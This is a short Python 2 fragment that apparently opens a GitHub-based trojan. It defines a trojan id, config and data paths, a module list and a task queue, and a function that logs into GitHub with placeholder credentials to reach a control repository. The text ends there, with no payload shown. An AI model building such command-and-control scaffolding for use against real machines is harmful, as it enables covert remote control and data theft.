#!/usr/bin/python

import json,base64,sys,time,imp,random,threading,Queue,os

from github3 import login

Tr_id = "abc" 

Tr_config = "%s.json" % Tr_id
data_path = "data/%s/"
Tr_modules = []
configured = False
task_queue = Queue.Queue()

def connect_to_github():
	gh = login(username="youruser",password="yourpass")
	repo = gh.repository("youruser", "Cbacc")
	branch = repo.branch("master")

	return gh,repo,branch

